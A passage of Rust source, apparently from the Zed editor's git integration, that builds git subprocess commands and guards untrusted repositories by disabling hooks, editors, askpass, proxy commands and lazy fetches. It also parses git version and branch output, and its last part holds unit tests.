            smol::spawn(async move {
                match smol::fs::metadata(&full_path).await {
                    Ok(metadata) if metadata.is_file() && metadata.len() >= MAX_SIZE => None,
                    _ => Some(path),
                }
            })
        })
        .collect::<Vec<_>>();

    let untracked_files = futures::future::join_all(size_checks)
        .await
        .into_iter()
        .flatten()
        .collect();
    Ok(untracked_files)
}

async fn add_files_to_index(git: &GitBinary, files: &[String]) -> Result<()> {
    if files.is_empty() {
        return Ok(());
    }

    let mut process = git
        .build_command(&["update-index", "--add", "-z", "--stdin"])
        .await
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let mut stdin = BufWriter::new(
        process
            .stdin
            .take()
            .context("no stdin for git update-index subprocess")?,
    );
    for file in files {
        stdin.write_all(file.as_bytes()).await?;
        stdin.write_all(b"\0").await?;
    }
    stdin.flush().await?;
    drop(stdin);

    let output = process.output().await?;
    anyhow::ensure!(
        output.status.success(),
        GitBinaryCommandError {
            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
            status: output.status,
        }
    );
    Ok(())
}

/// Whether [`run_allowed_git_command`] leaves hooks to the repository's trust, or turns them off
/// whatever it is.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum HookPolicy {
    Repository,
    Disabled,
}

/// The body of [`GitRepository::run_command`] and [`GitRepository::run_command_without_hooks`].
async fn run_allowed_git_command(
    git: Result<GitBinary>,
    args: Vec<String>,
    stdin: Option<String>,
    env: Arc<HashMap<String, String>>,
    command_env: HashMap<String, String>,
    hook_policy: HookPolicy,
) -> Result<GitCommandOutput> {
    let subcommand = validate_git_command(&args)?;
    validate_git_command_env(&command_env)?;

    let git = git?;
    if hook_policy == HookPolicy::Disabled {
        git.ensure_hooks_can_be_disabled().await?;
    }
    if let Some(operation) = hook_running_operation_name(subcommand) {
        git.ensure_hooks_are_disabled_if_untrusted(operation)
            .await?;
    }

    ensure_arguments_are_supported(subcommand, &args, git.version().await)?;
    let adapted = adapt_command_to_git_version(args, git.version().await);
    if adapted.dropped_autostash {
        // `--untracked-files=no`, because the stash `--autostash` takes would not have
        // covered untracked files either: refusing over them would leave the user with
        // an error they cannot act on.
        let status = git
            .build_command(&["status", "--porcelain", "--untracked-files=no"])
            .await
            .output()
            .await?;
        if !status.stdout.is_empty() {
            let version = git.version().await.map_or_else(
                || i18n::t!("unknown version").to_string(),
                |version| version.to_string(),
            );
            bail!(i18n::t!(
                "This git ({version}) does not support rebase --autostash, so commit or \
                 stash the changes in the working tree first (git {minimum} or later is \
                 needed).",
                minimum = GitFeature::RebaseAutostash.minimum_version()
            ));
        }
    }

    let mut command = git.build_command(&adapted.args).await;
    command.envs(env.iter());
    command.envs(&command_env);
    // Last, so that neither the repository's environment nor the caller's can put an
    // editor back. There is no terminal behind this process, so git must never try to
    // open one (`cherry-pick --continue`, `commit` without `-m`, `tag -a`, …): it
    // would hang the git worker. `:` is the one value git treats as "launch nothing",
    // so this also keeps an untrusted repository's `core.editor` from running.
    command.env("GIT_EDITOR", ":");
    command.env("GIT_SEQUENCE_EDITOR", ":");
    if hook_policy == HookPolicy::Disabled {
        // An object a partial clone lacks would otherwise be fetched from its promisor remote,
        // which for an agent's command is network access nobody approved. The first variable is
        // only read by git 2.45.1 and later; the second, an empty list of allowed transports,
        // stops every connection on any git that can disable hooks.
        command.env("GIT_NO_LAZY_FETCH", "1");
        command.env("GIT_ALLOW_PROTOCOL", "");
        // The repository's `core.worktree` would otherwise point checkouts and resets at any
        // directory, and a repository nested in the project may have been set up by the agent.
        if git.working_directory != git.git_directory {
            command.env("GIT_WORK_TREE", &git.working_directory);
        }
    }

    let output = if let Some(stdin_contents) = stdin {
        let mut child = command
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;
        let mut child_stdin = child.stdin.take().context("git command has no stdin")?;
        child_stdin.write_all(stdin_contents.as_bytes()).await?;
        child_stdin.flush().await?;
        drop(child_stdin);
        child.output().await?
    } else {
        command.output().await?
    };

    Ok(GitCommandOutput {
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
        exit_code: output.status.code(),
    })
}

pub(crate) struct GitBinary {
    git_binary_path: PathBuf,
    working_directory: PathBuf,
    git_directory: PathBuf,
    executor: BackgroundExecutor,
    index_file_path: Option<PathBuf>,
    envs: HashMap<String, String>,
    is_trusted: bool,
    identity: Option<Arc<GitIdentity>>,
}

impl GitBinary {
    pub(crate) fn new(
        git_binary_path: PathBuf,
        working_directory: PathBuf,
        git_directory: PathBuf,
        executor: BackgroundExecutor,
        is_trusted: bool,
    ) -> Self {
        Self {
            git_binary_path,
            working_directory,
            git_directory,
            executor,
            index_file_path: None,
            envs: HashMap::default(),
            is_trusted,
            identity: None,
        }
    }

    fn envs(mut self, envs: HashMap<String, String>) -> Self {
        self.envs = envs;
        self
    }

    /// This binary with every guard of an untrusted repository, whatever the project's trust.
    fn untrusted(mut self) -> Self {
        self.is_trusted = false;
        self
    }

    /// For [`GitRepository::run_command_without_hooks`]: unlike
    /// [`Self::ensure_hooks_are_disabled_if_untrusted`], every command is refused, whichever
    /// hooks it runs, and so is a git whose version is not known.
    async fn ensure_hooks_can_be_disabled(&self) -> Result<()> {
        let feature = GitFeature::HooksPath;
        match self.version().await {
            Some(version) if feature.is_supported_by(Some(version)) => Ok(()),
            Some(version) => bail!(i18n::t!(
                "An old git (older than {minimum}; this one is {version}) cannot turn off hooks, \
                 so the AI cannot run git commands. Update git to let it.",
                minimum = feature.minimum_version()
            )),
            None => bail!(i18n::t!(
                "The version of git could not be determined, so it is not known whether git can \
                 turn off hooks, and the AI cannot run git commands."
            )),
        }
    }

    /// The version of this git binary, probed once per binary path for the whole process.
    async fn version(&self) -> Option<GitVersion> {
        let probe = GIT_BINARY_VERSIONS
            .lock()
            .entry(self.git_binary_path.clone())
            .or_default()
            .clone();
        let mut probe = probe.lock().await;
        if let Some(version) = probe.version {
            return version;
        }
        if probe
            .last_failure
            .is_some_and(|failed_at| failed_at.elapsed() < GIT_VERSION_PROBE_RETRY_INTERVAL)
        {
            return None;
        }
        match self.probe_version().await {
            Ok(version) => {
                probe.version = Some(version);
                version
            }
            Err(error) => {
                if probe.last_failure.is_none() {
                    log::error!(
                        "probing the version of {:?}: {error:#}",
                        self.git_binary_path
                    );
                }
                probe.last_failure = Some(Instant::now());
                None
            }
        }
    }

    #[allow(clippy::disallowed_methods)]
    async fn probe_version(&self) -> Result<Option<GitVersion>> {
        // Not `build_command`: the options it adds depend on this very version.
        let output = new_command(&self.git_binary_path)
            .arg("--version")
            .stdin(Stdio::null())
            .output()
            .await?;
        anyhow::ensure!(
            output.status.success(),
            GitBinaryCommandError {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                status: output.status,
            }
        );
        let output = String::from_utf8_lossy(&output.stdout);
        let version = GitVersion::parse(&output);
        if version.is_none() {
            log::warn!("unrecognized `git --version` output: {output:?}");
        }
        Ok(version)
    }

    /// `build_command` disables an untrusted repository's hooks through `core.hooksPath`, which
    /// git ignores before 2.9, so with such a git the operations that run hooks wait for the
    /// project to be trusted.
    async fn ensure_hooks_are_disabled_if_untrusted(&self, operation: &str) -> Result<()> {
        let feature = GitFeature::HooksPath;
        if let Some(version) = self.untrusted_version_without(feature).await {
            bail!(i18n::t!(
                "This project is not trusted, and an old git (older than {minimum}; this one is \
                 {version}) cannot turn off hooks, so \"{operation}\" cannot run. Trust the \
                 project to run it.",
                minimum = feature.minimum_version()
            ));
        }
        Ok(())
    }

    /// In an untrusted repository, remote operations rely on `protocol.ext.allow` (git 2.12)
    /// and on resetting `credential.helper` (git 2.9) to keep the repository's configuration
    /// from running programs; older git ignores both.
    async fn ensure_transports_are_restricted_if_untrusted(&self, operation: &str) -> Result<()> {
        let feature = GitFeature::ProtocolAllow;
        if let Some(version) = self.untrusted_version_without(feature).await {
            bail!(i18n::t!(
                "This project is not trusted, and an old git (older than {minimum}; this one is \
                 {version}) cannot stop the repository's settings from running programs, so \
                 \"{operation}\" cannot run. Trust the project to run it.",
                minimum = feature.minimum_version()
            ));
        }
        Ok(())
    }

    /// The version of git when the repository is untrusted and that git is known to lack
    /// `feature`.
    async fn untrusted_version_without(&self, feature: GitFeature) -> Option<GitVersion> {
        if self.is_trusted {
            return None;
        }
        self.version()
            .await
            .filter(|version| !feature.is_supported_by(Some(*version)))
    }

    pub async fn with_temp_index<R>(
        &mut self,
        f: impl AsyncFnOnce(&Self) -> Result<R>,
    ) -> Result<R> {
        let index_file_path = self.path_for_index_id(Uuid::new_v4());

        let delete_temp_index = util::defer({
            let index_file_path = index_file_path.clone();
            let executor = self.executor.clone();
            move || {
                executor
                    .spawn(async move {
                        smol::fs::remove_file(index_file_path).await.log_err();
                    })
                    .detach();
            }
        });

        // Copy the default index file so that Git doesn't have to rebuild the
        // whole index from scratch. This might fail if this is an empty repository.
        smol::fs::copy(self.git_directory.join("index"), &index_file_path)
            .await
            .ok();

        self.index_file_path = Some(index_file_path.clone());
        let result = f(self).await;
        self.index_file_path = None;
        let result = result?;

        smol::fs::remove_file(index_file_path).await.ok();
        delete_temp_index.abort();

        Ok(result)
    }

    fn path_for_index_id(&self, id: Uuid) -> PathBuf {
        self.git_directory.join(format!("index-{}.tmp", id))
    }

    pub async fn run<S>(&self, args: &[S]) -> Result<String>
    where
        S: AsRef<OsStr>,
    {
        let mut stdout = self.run_raw(args).await?;
        if stdout.chars().last() == Some('\n') {
            stdout.pop();
        }
        Ok(stdout)
    }

    /// Returns the result of the command without trimming the trailing newline.
    pub async fn run_raw<S>(&self, args: &[S]) -> Result<String>
    where
        S: AsRef<OsStr>,
    {
        let mut command = self.build_command(args).await;
        let output = command.output().await?;
        anyhow::ensure!(
            output.status.success(),
            GitBinaryCommandError {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                status: output.status,
            }
        );
        Ok(String::from_utf8(output.stdout)?)
    }

    /// A command that reads the configuration or the index of this repository, or of the
    /// submodule checked out at `directory`, for [`Self::untrusted_config_overrides`].
    #[allow(clippy::disallowed_methods)]
    fn untrusted_probe_command(
        &self,
        directory: &Path,
        is_submodule: bool,
    ) -> util::command::Command {
        let mut command = new_command(&self.git_binary_path);
        command
            .current_dir(directory)
            .envs(&self.envs)
            .stdin(Stdio::null());
        if is_submodule {
            // Any of these would point git back at the superproject.
            for variable in [
                "GIT_DIR",
                "GIT_WORK_TREE",
                "GIT_INDEX_FILE",
                "GIT_COMMON_DIR",
                "GIT_OBJECT_DIRECTORY",
                "GIT_ALTERNATE_OBJECT_DIRECTORIES",
            ] {
                command.env_remove(variable);
            }
        } else if let Some(index_file_path) = self.index_file_path.as_ref() {
            command.env("GIT_INDEX_FILE", index_file_path);
        }
        command
    }

    /// The configuration of the repository at `directory` that must not get to run a program.
    async fn read_untrusted_config(
        &self,
        directory: &Path,
        is_submodule: bool,
        version: Option<GitVersion>,
    ) -> Result<UntrustedConfigOverrides> {
        let with_scope = GitFeature::ConfigShowScope.is_supported_by(version);
        // Not `build_command`, which asks for these; reading the configuration runs nothing.
        let mut command = self.untrusted_probe_command(directory, is_submodule);
        command.args(["config", "-z"]);
        if with_scope {
            command.arg("--show-scope");
        }
        let output = command
            .args(["--get-regexp", UNTRUSTED_CONFIG_PATTERN])
            .output()
            .await?;
        match output.status.code() {
            Some(0) => untrusted_config_overrides(&output.stdout, with_scope),
            // What `--get-regexp` says when nothing matches.
            Some(1) => Ok(UntrustedConfigOverrides::default()),
            _ => Err(GitBinaryCommandError {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                status: output.status,
            }
            .into()),
        }
    }

    /// The submodules checked out in the repository at `directory`: the gitlinks of its index
    /// whose directory holds a `.git`, which is where git looks inside for changes.
    async fn checked_out_submodules(
        &self,
        directory: &Path,
        is_submodule: bool,
        version: Option<GitVersion>,
    ) -> Result<Vec<PathBuf>> {
        let output = self
            .untrusted_probe_command(directory, is_submodule)
            // Reading the index would otherwise ask the repository's fsmonitor hook.
            .args(git_global_args(version, false))
            .args(["ls-files", "-z", "--stage"])
            .output()
            .await?;
        anyhow::ensure!(
            output.status.success(),
            GitBinaryCommandError {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                status: output.status,
            }
        );
        let mut submodules = BTreeSet::new();
        for entry in output
            .stdout
            .split(|byte| *byte == b'\0')
            .filter(|entry| !entry.is_empty())
        {
            // `<mode> <object> <stage>\t<path>`
            let Some(tab) = entry.iter().position(|byte| *byte == b'\t') else {
                bail!(
                    "unexpected ls-files entry {:?}",
                    String::from_utf8_lossy(entry)
                );
            };
            if !entry.starts_with(b"160000 ") {
                continue;
            }
            let path = directory.join(path_from_git_output(&entry[tab + 1..])?);
            if smol::fs::metadata(path.join(".git")).await.is_ok() {
                submodules.insert(path);
            }
        }
        Ok(submodules.into_iter().collect())
    }

    /// What keeps this untrusted repository's own configuration from running a program. With
    /// `include_submodules`, also the configuration of every submodule checked out inside it,
    /// however deep, since `-c` reaches git running there through `GIT_CONFIG_PARAMETERS`.
    async fn untrusted_config_overrides(
        &self,
        version: Option<GitVersion>,
        include_submodules: bool,
    ) -> Result<UntrustedConfigOverrides> {
        let mut overrides = self
            .read_untrusted_config(&self.working_directory, false, version)
            .await?;
        // A bare repository has no submodules checked out.
        if !include_submodules || self.working_directory == self.git_directory {
            return Ok(overrides);
        }
        let mut pending = vec![(self.working_directory.clone(), 0)];
        while let Some((directory, depth)) = pending.pop() {
            let submodules = self
                .checked_out_submodules(&directory, depth > 0, version)
                .await?;
            for submodule in submodules {
                anyhow::ensure!(
                    depth < MAX_UNTRUSTED_SUBMODULE_DEPTH,
                    "submodules nested more than {MAX_UNTRUSTED_SUBMODULE_DEPTH} deep at {submodule:?}"
                );
                overrides.add_submodule(
                    self.read_untrusted_config(&submodule, true, version)
                        .await?,
                );
                pending.push((submodule, depth + 1));
            }
        }
        Ok(overrides)
    }

    fn with_identity(mut self, identity: Option<Arc<GitIdentity>>) -> Self {
        self.identity = identity;
        self
    }

    pub(crate) async fn build_command<S>(&self, args: &[S]) -> util::command::Command
    where
        S: AsRef<OsStr>,
    {
        self.build_command_with_overrides(args).await.0
    }

    /// [`Self::build_command`], also returning what it disabled of an untrusted repository's
    /// configuration.
    #[allow(clippy::disallowed_methods)]
    async fn build_command_with_overrides<S>(
        &self,
        args: &[S],
    ) -> (util::command::Command, Option<UntrustedConfigOverrides>)
    where
        S: AsRef<OsStr>,
    {
        let version = self.version().await;
        let mut command = new_command(&self.git_binary_path);
        command.current_dir(&self.working_directory);
        let mut global_args = git_global_args(version, self.is_trusted);
        // The output is always piped, so git wouldn't start a pager without `--no-pager` either.
        if args
            .first()
            .is_some_and(|argument| argument.as_ref() == "worktree")
            && !GitFeature::NoPagerWorktree.is_supported_by(version)
        {
            global_args.retain(|argument| *argument != "--no-pager");
        }
        command.args(global_args);
        if let Some(identity) = &self.identity {
            command.args(identity.config_args());
        }
        let mut applied_overrides = None;
        let may_contact_remotes = command_may_contact_remotes(args);
        let mut lazy_fetch_is_safe = false;
        if !self.is_trusted
            && (command_may_run_filters(args)
                || command_may_run_signature_programs(args)
                || may_contact_remotes)
        {
            match self
                .untrusted_config_overrides(version, command_may_look_inside_submodules(args))
                .await
            {
                Ok(overrides) => {
                    lazy_fetch_is_safe = overrides.remote_programs.is_empty();
                    if !lazy_fetch_is_safe && may_contact_remotes {
                        log::error!(
                            "refusing a git command in an untrusted repository that sets {:?}",
                            overrides.remote_programs
                        );
                        command.args(refusal_config_args(UNTRUSTED_REMOTE_PROGRAMS_REFUSED));
                    }
                    command.args(overrides.args());
                    applied_overrides = Some(overrides);
                }
                Err(error) => {
                    log::error!(
                        "refusing a git command in an untrusted repository whose filter drivers could not be disabled: {error:#}"
                    );
                    // A key without a section fails the command before it can start a driver,
                    // and git's error quotes the key, so it says why.
                    command.args(refusal_config_args(UNTRUSTED_FILTERS_NOT_DISABLED));
                }
            }
        } else if !self.is_trusted && is_partial_clone(&self.git_directory).await {
            // Reading the objects a partial clone lacks, such as the older contents in a commit's
            // diff (`cat-file --batch`), needs a lazy fetch; refusing it where the repository sets
            // no program would break those views for every partial clone.
            match self
                .read_untrusted_config(&self.working_directory, false, version)
                .await
            {
                Ok(overrides) => lazy_fetch_is_safe = overrides.remote_programs.is_empty(),
                Err(error) => log::error!(
                    "disabling lazy fetches in an untrusted partial clone whose configuration could not be read: {error:#}"
                ),
            }
        }
        match args.split_first() {
            // Right after the subcommand rather than at the end, where a `--` before it would
            // turn the option into a pathspec and leave the repository's diff programs enabled.
            Some((subcommand, rest)) if !self.is_trusted => {
                command.arg(subcommand);
                command.args(untrusted_subcommand_guards(subcommand.as_ref()));
                command.args(rest);
            }
            _ => {
                command.args(args);
            }
        }

        if !self.is_trusted {
            // Unless the repository is known to set no `uploadpack`, a lazy fetch of a partial
            // clone's missing object must not connect (git 2.45.1 and later honor this).
            if !lazy_fetch_is_safe {
                command.env("GIT_NO_LAZY_FETCH", "1");
            }
            // Either variable, even empty, keeps git from reading the repository's `core.askPass`
            // or `core.gitProxy`; `-c` cannot replace the latter, of which git takes the first
            // matching value. One set for Zed itself is the user's and is left alone.
            for variable in ["GIT_ASKPASS", "GIT_PROXY_COMMAND"] {
                if std::env::var_os(variable).is_none() {
                    command.env(variable, "");
                }
            }
        }
        if let Some(index_file_path) = self.index_file_path.as_ref() {
            command.env("GIT_INDEX_FILE", index_file_path);
        }
        if let Some(identity) = &self.identity {
            command.envs(identity.environment());
        }
        command.envs(&self.envs);
        (command, applied_overrides)
    }
}

#[derive(Error, Debug)]
#[error("Git command failed:\n{stdout}{stderr}\n")]
struct GitBinaryCommandError {
    stdout: String,
    stderr: String,
    status: ExitStatus,
}

async fn run_git_command(
    env: Arc<HashMap<String, String>>,
    ask_pass: AskPassDelegate,
    mut command: util::command::Command,
    executor: BackgroundExecutor,
) -> Result<RemoteCommandOutput> {
    if env.contains_key("GIT_ASKPASS") {
        let git_process = command.spawn()?;
        let output = git_process.output().await?;
        anyhow::ensure!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        Ok(RemoteCommandOutput {
            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
        })
    } else {
        let ask_pass = AskPassSession::new(executor, ask_pass).await?;
        command
            .env("GIT_ASKPASS", ask_pass.script_path())
            .env("SSH_ASKPASS", ask_pass.script_path())
            .env("SSH_ASKPASS_REQUIRE", "force");

        if !env.contains_key("GIT_CONFIG_COUNT")
            && let Some(gpg_wrapper) = ask_pass.gpg_wrapper_path()
        {
            command
                .env("GIT_CONFIG_COUNT", "1")
                .env("GIT_CONFIG_KEY_0", "gpg.program")
                .env("GIT_CONFIG_VALUE_0", gpg_wrapper);
        }

        #[cfg(target_os = "windows")]
        command.env("ZED_ASKPASS_SOCKET", ask_pass.socket_path());
        let git_process = command.spawn()?;

        run_askpass_command(ask_pass, git_process).await
    }
}

async fn run_askpass_command(
    mut ask_pass: AskPassSession,
    git_process: util::command::Child,
) -> anyhow::Result<RemoteCommandOutput> {
    select_biased! {
        // Git can legitimately run long without prompting (e.g. large fetches,
        // hooks), so completion is determined by the process itself.
        result = ask_pass.run(None).fuse() => {
            match result {
                AskPassResult::CancelledByUser => {
                    Err(anyhow!(REMOTE_CANCELLED_BY_USER))?
                }
                AskPassResult::Timedout => {
                    // Unreachable since no timeout is passed to run()
                    Err(anyhow!("Connecting to host timed out"))?
                }
            }
        }
        output = git_process.output().fuse() => {
            let output = output?;
            anyhow::ensure!(
                output.status.success(),
                "{}",
                String::from_utf8_lossy(&output.stderr)
            );
            Ok(RemoteCommandOutput {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
            })
        }
    }
}

#[derive(Clone, Ord, Hash, PartialOrd, Eq, PartialEq)]
pub struct RepoPath(Arc<RelPath>);

impl std::fmt::Debug for RepoPath {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        self.0.fmt(f)
    }
}

impl RepoPath {
    pub fn new<S: AsRef<str> + ?Sized>(s: &S) -> Result<Self> {
        let rel_path = RelPath::from_unix_str(s.as_ref())?;
        Ok(Self::from_rel_path(rel_path))
    }

    pub fn from_std_path(path: &Path, path_style: PathStyle) -> Result<Self> {
        let rel_path = RelPath::new(path, path_style)?;
        Ok(Self::from_rel_path(&rel_path))
    }

    pub fn from_proto(proto: &str) -> Result<Self> {
        let rel_path = RelPath::from_unix_str(proto)?.into();
        Ok(Self(rel_path))
    }

    pub fn from_rel_path(path: &RelPath) -> RepoPath {
        Self(Arc::from(path))
    }

    pub fn as_std_path(&self) -> &Path {
        if self.is_empty() {
            Path::new(".")
        } else {
            self.0.as_std_path()
        }
    }
}

#[cfg(any(test, feature = "test-support"))]
pub fn repo_path<S: AsRef<str> + ?Sized>(s: &S) -> RepoPath {
    RepoPath(RelPath::from_unix_str(s.as_ref()).unwrap().into())
}

impl AsRef<Arc<RelPath>> for RepoPath {
    fn as_ref(&self) -> &Arc<RelPath> {
        &self.0
    }
}

impl std::ops::Deref for RepoPath {
    type Target = RelPath;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

#[derive(Debug)]
pub struct RepoPathDescendants<'a>(pub &'a RepoPath);

impl MapSeekTarget<RepoPath> for RepoPathDescendants<'_> {
    fn cmp_cursor(&self, key: &RepoPath) -> Ordering {
        if key.starts_with(self.0) {
            Ordering::Greater
        } else {
            self.0.cmp(key)
        }
    }
}

/// Skips the rows that don't parse, except for git without `%(committerdate:unix)` or reliable
/// `%(upstream:track)` output, whose rows are kept rather than lost.
fn parse_branch_input(input: &str, version: Option<GitVersion>) -> Result<Vec<Branch>> {
    let has_unix_dates = GitFeature::UnixDateFormat.is_supported_by(version);
    // Before git 2.13 `%(upstream:track)` can print uninitialized counts for a deleted upstream,
    // which `mark_missing_upstreams_gone` then corrects.
    let has_reliable_tracking = GitFeature::UpstreamGone.is_supported_by(version);
    let mut branches = Vec::new();
    for line in input.split('\n') {
        if line.is_empty() {
            continue;
        }
        let mut fields = line.split('\x00');
        let Some(head) = fields.next() else {
            continue;
        };
        let Some(head_sha) = fields.next().map(|f| f.to_string().into()) else {
            continue;
        };
        let Some(parent_sha) = fields.next().map(|f| f.to_string()) else {
            continue;
        };
        let Some(ref_name): Option<SharedString> = fields.next().map(|f| f.to_string().into())
        else {
            continue;
        };
        let Some(upstream_name) = fields.next().map(|f| f.to_string()) else {
            continue;
        };
        let Some(upstream_track) = fields.next() else {
            continue;
        };
        let upstream_tracking = match parse_upstream_track(upstream_track) {
            Ok(upstream_tracking) => upstream_tracking,
            Err(_) if has_reliable_tracking => continue,
            Err(error) => {
                log::warn!(
                    "unrecognized upstream tracking {upstream_track:?} of {ref_name}: {error:#}"
                );
                UpstreamTracking::Tracked(UpstreamTrackingStatus {
                    ahead: 0,
                    behind: 0,
                })
            }
        };
        let Some(committer_date) = fields.next() else {
            continue;
        };
        let commit_timestamp = if has_unix_dates {
            let Ok(commit_timestamp) = committer_date.parse::<i64>() else {
                continue;
            };
            commit_timestamp
        } else {
            // `%(committerdate:raw)` follows the timestamp with a time zone.
            match committer_date
                .split_whitespace()
                .next()
                .and_then(|timestamp| timestamp.parse::<i64>().ok())
            {
                Some(commit_timestamp) => commit_timestamp,
                None => {
                    log::warn!("unrecognized committer date {committer_date:?} of {ref_name}");
                    0
                }
            }
        };
        let Some(author_name) = fields.next().map(|f| f.to_string().into()) else {
            continue;
        };
        let Some(subject) = fields.next().map(|f| f.to_string().into()) else {
            continue;
        };

        branches.push(Branch {
            is_head: head == "*",
            ref_name,
            most_recent_commit: Some(CommitSummary {
                sha: head_sha,
                subject,
                commit_timestamp,
                author_name: author_name,
                has_parent: !parent_sha.is_empty(),
            }),
            upstream: if upstream_name.is_empty() {
                None
            } else {
                Some(Upstream {
                    ref_name: upstream_name.into(),
                    tracking: upstream_tracking,
                })
            },
        })
    }

    Ok(branches)
}

fn format_branch_scan_error(output: &Output) -> String {
    let stderr = String::from_utf8_lossy(&output.stderr)
        .trim()
        .replace('\n', " ");
    if stderr.is_empty() {
        format!("git for-each-ref exited with {}", output.status)
    } else {
        stderr
    }
}

fn parse_upstream_track(upstream_track: &str) -> Result<UpstreamTracking> {
    if upstream_track.is_empty() {
        return Ok(UpstreamTracking::Tracked(UpstreamTrackingStatus {
            ahead: 0,
            behind: 0,
        }));
    }

    let upstream_track = upstream_track.strip_prefix("[").context("missing [")?;
    let upstream_track = upstream_track.strip_suffix("]").context("missing [")?;
    let mut ahead: u32 = 0;
    let mut behind: u32 = 0;
    for component in upstream_track.split(", ") {
        if component == "gone" {
            return Ok(UpstreamTracking::Gone);
        }
        if let Some(ahead_num) = component.strip_prefix("ahead ") {
            ahead = ahead_num.parse::<u32>()?;
        }
        if let Some(behind_num) = component.strip_prefix("behind ") {
            behind = behind_num.parse::<u32>()?;
        }
    }
    Ok(UpstreamTracking::Tracked(UpstreamTrackingStatus {
        ahead,
        behind,
    }))
}

fn checkpoint_author_envs() -> HashMap<String, String> {
    HashMap::from_iter([
        ("GIT_AUTHOR_NAME".to_string(), "Zed".to_string()),
        ("GIT_AUTHOR_EMAIL".to_string(), "hi@zed.dev".to_string()),
        ("GIT_COMMITTER_NAME".to_string(), "Zed".to_string()),
        ("GIT_COMMITTER_EMAIL".to_string(), "hi@zed.dev".to_string()),
    ])
}

#[cfg(test)]
mod tests {
    use std::{
        ffi::{OsStr, OsString},
        fs,
    };

    use super::*;
    use gpui::TestAppContext;

    #[test]
    fn test_commit_hash_search_query_accepts_sha1_and_sha256_hashes() {
        assert_eq!(
            commit_hash_search_query("0123456789abcdef0123456789abcdef01234567"),
            Some("0123456789abcdef0123456789abcdef01234567")
        );
        assert_eq!(
            commit_hash_search_query(
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
            ),
            Some("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
        );
        assert_eq!(
            commit_hash_search_query(
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0"
            ),
            None
        );
    }

    fn disable_git_global_config() {
        unsafe {
            std::env::set_var("GIT_CONFIG_GLOBAL", "");
            std::env::set_var("GIT_CONFIG_SYSTEM", "");
        }
    }

    fn installed_git_version() -> GitVersion {
        GitVersion::parse(&git_command_output(Path::new("."), ["--version"]))
            .expect("the installed git's version should be recognized")
    }

    fn installed_git_supports(feature: GitFeature) -> bool {
        feature.is_supported_by(Some(installed_git_version()))
    }

    /// Operations that run hooks wait for trust when git can't disable hooks, so tests that
    /// aren't about trust run trusted on such a git.
    fn trust_if_hooks_cannot_be_disabled(repository: &RealGitRepository) {
        if !installed_git_supports(GitFeature::HooksPath) {
            repository.set_trusted(true);
        }
    }

    /// Makes `GitBinary::version` report `version` for `git_binary_path` without running it.
    fn pretend_git_version(git_binary_path: impl Into<PathBuf>, version: GitVersion) {
        GIT_BINARY_VERSIONS.lock().insert(
            git_binary_path.into(),
            Arc::new(smol::lock::Mutex::new(GitVersionProbe {
                version: Some(Some(version)),
                last_failure: None,
            })),
        );
    }

    fn pretend_git_binary(
        git_binary_path: &str,
        version: GitVersion,
        is_trusted: bool,
        cx: &TestAppContext,
    ) -> GitBinary {
        pretend_git_version(git_binary_path, version);
        GitBinary::new(
            PathBuf::from(git_binary_path),
            PathBuf::from("/"),
            PathBuf::from("/.git"),
            cx.executor(),
            is_trusted,
        )
    }

    #[test]
    fn test_git_status_args_untracked_files_modes() {
        let untracked_argument = |untracked_files| {
            git_status_args(&[], untracked_files, None)
                .into_iter()
                .find(|argument| argument.to_string_lossy().starts_with("--untracked-files="))
                .expect("status args always carry an --untracked-files argument")
        };

        assert_eq!(
            untracked_argument(StatusUntrackedFiles::All),
            OsString::from("--untracked-files=all")
        );
        assert_eq!(
            untracked_argument(StatusUntrackedFiles::Normal),
            OsString::from("--untracked-files=normal")
        );
        assert_eq!(
            untracked_argument(StatusUntrackedFiles::No),
            OsString::from("--untracked-files=no")
        );
        assert_eq!(
            untracked_argument(StatusUntrackedFiles::default()),
            OsString::from("--untracked-files=all"),
            "the default must stay `all` so that existing projects keep their per-file statuses"
        );
    }

    #[test]
    fn test_git_status_args_path_prefixes() {
        let repo_path = |path: &str| {
            RepoPath::from_rel_path(&RelPath::new(path.as_ref(), PathStyle::Unix).unwrap())
        };
        let args = git_status_args(
            &[repo_path("src/main.rs"), repo_path("")],
            StatusUntrackedFiles::Normal,
            None,
        );
        let args = args
            .iter()
            .map(|arg| arg.to_string_lossy().into_owned())
            .collect::<Vec<_>>();
        let separator = args
            .iter()
            .position(|arg| arg == "--")
            .expect("status args are always terminated by `--`");
        assert_eq!(
            &args[separator + 1..],
            &[
                Path::new("src/main.rs").to_string_lossy().into_owned(),
                ".".to_string()
            ]
        );
    }

    #[test]
    fn test_git_version_parse() {
        let version = |major, minor, patch| {
            Some(GitVersion {
                major,
                minor,
                patch,
            })
        };
        assert_eq!(GitVersion::parse("git version 2.17.1\n"), version(2, 17, 1));
        assert_eq!(
            GitVersion::parse("git version 2.45.1.windows.1\n"),
            version(2, 45, 1)
        );
        assert_eq!(
            GitVersion::parse("git version 2.39.3 (Apple Git-146)\n"),
            version(2, 39, 3)
        );
        assert_eq!(
            GitVersion::parse("git version 2.45.GIT\n"),
